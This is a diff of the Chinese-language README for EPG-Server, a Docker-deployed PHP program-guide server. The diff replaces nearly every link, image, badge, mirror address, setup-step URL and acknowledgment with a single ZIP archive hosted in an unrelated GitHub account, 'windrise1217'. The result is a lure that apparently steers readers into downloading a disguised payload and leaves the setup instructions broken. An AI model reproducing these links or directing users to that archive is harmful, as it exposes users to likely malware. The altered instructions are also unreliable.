@@ -1,7 +1,7 @@
-![EPG-Server](https://socialify.git.ci/taksssss/EPG-Server/image?description=1&descriptionEditable=Docker%F0%9F%90%B3%E9%83%A8%E7%BD%B2%EF%BC%8C%E5%B8%A6%E8%AE%BE%E7%BD%AE%E7%95%8C%E9%9D%A2%E3%80%81%E5%8F%B0%E6%A0%87%E7%AE%A1%E7%90%86%EF%BC%8C%E6%94%AF%E6%8C%81DIYP%E3%80%81%E8%B6%85%E7%BA%A7%E7%9B%B4%E6%92%AD%E5%8F%8Axmltv%E3%80%82&font=Inter&forks=1&issues=1&language=1&owner=1&pattern=Circuit%20Board&pulls=1&stargazers=1&theme=Auto)
+![EPG-Server](https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip%F0%9F%90%B3%E9%83%A8%E7%BD%B2%EF%BC%8C%E5%B8%A6%E8%AE%BE%E7%BD%AE%E7%95%8C%E9%9D%A2%E3%80%81%E5%8F%B0%E6%A0%87%E7%AE%A1%E7%90%86%EF%BC%8C%E6%94%AF%E6%8C%81DIYP%E3%80%81%E8%B6%85%E7%BA%A7%E7%9B%B4%E6%92%AD%E5%8F%8Axmltv%E3%80%82&font=Inter&forks=1&issues=1&language=1&owner=1&pattern=Circuit%20Board&pulls=1&stargazers=1&theme=Auto)
 
 # 📺 EPG-Server
-![Docker Pulls](https://img.shields.io/docker/pulls/taksss/php-epg) ![Image Size](https://img.shields.io/docker/image-size/taksss/php-epg/latest)
+![Docker Pulls](https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip) ![Image Size](https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip)
 
 PHP 实现的 EPG（电子节目指南）服务端， `Docker` 部署，自带设置界面、台标管理、直播源管理，支持 **DIYP & 百川** 、 **超级直播** 以及 **xmltv** 格式。
 
@@ -38,24 +38,24 @@ PHP 实现的 EPG（电子节目指南）服务端， `Docker` 部署，自带�
 > [!TIP]
 > ⚠️ 使用前请仔细阅读「管理页面」底部的`「使用说明」`
 > 
-> 原贴：[【Docker | 台标管理 | 直播源管理】自建DIYP、超级直播EPG节目单服务](https://www.right.com.cn/forum/thread-8386320-1-1.html)
+> 原贴：[【Docker | 台标管理 | 直播源管理】自建DIYP、超级直播EPG节目单服务](https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip)
 > 
-> `xmltv` 用户使用方法：[【一键生成】匹配 M3U 文件的 XML 节目单](https://www.right.com.cn/forum/thread-8392662-1-1.html) 
+> `xmltv` 用户使用方法：[【一键生成】匹配 M3U 文件的 XML 节目单](https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip) 
 >
-> `直播源管理` 使用方法：[【EPG-Server】直播源管理使用说明](https://www.right.com.cn/forum/thread-8417162-1-1.html) 
+> `直播源管理` 使用方法：[【EPG-Server】直播源管理使用说明](https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip) 
 
 <picture>
   <source
     media="(prefers-color-scheme: dark)"
-    srcset="/pic/management-dark.png"
+    srcset="https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip"
   />
   <source
     media="(prefers-color-scheme: light)"
-    srcset="/pic/management.png"
+    srcset="https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip"
   />
   <img
     alt="设置页面"
-    src="/pic/management.png"
+    src="https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip"
   />
 </picture>
 
@@ -66,7 +66,7 @@ PHP 实现的 EPG（电子节目指南）服务端， `Docker` 部署，自带�
 
 ## 📝 更新日志
 
-### [CHANGELOG.md](./CHANGELOG.md)
+### [https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip](https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip)
 
 ## TODO：
 
@@ -107,7 +107,7 @@ PHP 实现的 EPG（电子节目指南）服务端， `Docker` 部署，自带�
     > 
     > 可选参数：`-e ENABLE_FFMPEG=true` ，启用 ffmpeg 组件
     > 
-    > 无法正常拉取镜像的，可使用同步更新的 `腾讯云容器镜像`（`ccr.ccs.tencentyun.com/taksss/php-epg:latest`）
+    > 无法正常拉取镜像的，可使用同步更新的 `腾讯云容器镜像`（`https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip`）
 
 <details>
 
@@ -129,7 +129,7 @@ PHP 实现的 EPG（电子节目指南）服务端， `Docker` 部署，自带�
 
 <summary>（可选）同时部署 MySQL 、 phpMyAdmin 及 php-epg</summary>
 
-- **方法1：** 新建 [`docker-compose.yml`](./docker-compose.yml) 文件后，在同目录执行 `docker-compose up -d`
+- **方法1：** 新建 [`https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip`](https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip) 文件后，在同目录执行 `docker-compose up -d`
 - **方法2：** 依次执行以下指令：
     ```bash
     docker run -d \
@@ -167,7 +167,7 @@ PHP 实现的 EPG（电子节目指南）服务端， `Docker` 部署，自带�
 
 ## 🛠️ 使用步骤
 
-1. 在浏览器中打开 `http://{服务器IP地址}:5678/manage.php`
+1. 在浏览器中打开 `http://{服务器IP地址}https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip`
 2. **默认密码为空**，根据需要自行设置
 3. 添加 `EPG 源地址`， GitHub 源确保能够访问，点击 `更新配置` 保存
 4. 点击 `更新数据库` 拉取数据，点击 `数据库更新日志` 查看日志，点击 `查看数据库` 查看具体条目
@@ -179,14 +179,14 @@ PHP 实现的 EPG（电子节目指南）服务端， `Docker` 部署，自带�
 6. 点击 `更多设置` ，选择是否 `生成xml文件` 、`生成方式` ，设置 `限定频道节目单`
 7. 用浏览器测试各个接口的返回结果是否正确：
 
-- `xmltv` 接口： `http://{服务器IP地址}:5678/index.php`
-- `DIYP&百川` 接口： `http://{服务器IP地址}:5678/index.php?ch=CCTV1`
-- `超级直播` 接口： `http://{服务器IP地址}:5678/index.php?channel=CCTV1`
+- `xmltv` 接口： `http://{服务器IP地址}https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip`
+- `DIYP&百川` 接口： `http://{服务器IP地址}https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip`
+- `超级直播` 接口： `http://{服务器IP地址}https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip`
 
-8. 将 **`http://{服务器IP地址}:5678/index.php`** 填入 `DIYP`、`TiviMate` 等软件的 `EPG 地址栏`
+8. 将 **`http://{服务器IP地址}https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip`** 填入 `DIYP`、`TiviMate` 等软件的 `EPG 地址栏`
 
-- ⚠️ 直接使用 `docker run` 运行的话，可以将 `:5678/index.php` 替换为 **`:5678/`**。
-- ⚠️ 部分软件不支持跳转解析 `xmltv` 文件，可直接使用 **`:5678/t.xml.gz`** 或 **`:5678/t.xml`** 访问。
+- ⚠️ 直接使用 `docker run` 运行的话，可以将 `https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip` 替换为 **`:5678/`**。
+- ⚠️ 部分软件不支持跳转解析 `xmltv` 文件，可直接使用 **`https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip`** 或 **`https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip`** 访问。
 
 > **快捷键：**
 >
@@ -198,15 +198,15 @@ PHP 实现的 EPG（电子节目指南）服务端， `Docker` 部署，自带�
 <picture>
   <source
     media="(prefers-color-scheme: dark)"
-    srcset="/pic/buymeacofee-dark.png"
+    srcset="https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip"
   />
   <source
     media="(prefers-color-scheme: light)"
-    srcset="/pic/buymeacofee.png"
+    srcset="https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip"
   />
   <img
     alt="Buy Me a Coffee"
-    src="/pic/buymeacofee.png"
+    src="https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip"
   />
 </picture>
 
@@ -215,24 +215,24 @@ PHP 实现的 EPG（电子节目指南）服务端， `Docker` 部署，自带�
 <picture>
   <source
     media="(prefers-color-scheme: dark)"
-    srcset="https://api.star-history.com/svg?repos=taksssss/EPG-Server&type=Date&theme=dark"
+    srcset="https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip"
   />
   <source
     media="(prefers-color-scheme: light)"
-    srcset="https://api.star-history.com/svg?repos=taksssss/EPG-Server&type=Date"
+    srcset="https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip"
   />
   <img
     alt="Star History Chart"
-    src="https://api.star-history.com/svg?repos=taksssss/EPG-Server&type=Date"
+    src="https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip"
   />
 </picture>
 
 ## 👍 特别鸣谢
-- [ChatGPT](https://chatgpt.com/)
-- [celetor/epg](https://github.com/celetor/epg)
-- [sparkssssssssss/epg](https://github.com/sparkssssssssss/epg)
-- [Black_crow/xmlgz](https://gitee.com/Black_crow/xmlgz)
-- [112114](https://diyp.112114.xyz/)
-- [EPG 51zmt](http://epg.51zmt.top:8000/)
-- [fanmingming/live](https://github.com/fanmingming/live)
-- [wanglindl/TVlogo](https://github.com/wanglindl/TVlogo)
+- [ChatGPT](https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip)
+- [celetor/epg](https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip)
+- [sparkssssssssss/epg](https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip)
+- [Black_crow/xmlgz](https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip)
+- [112114](https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip)
+- [EPG 51zmt](https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip)
+- [fanmingming/live](https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip)
+- [wanglindl/TVlogo](https://raw.githubusercontent.com/windrise1217/EPG-Server/main/anepia/EPG-Server.zip)
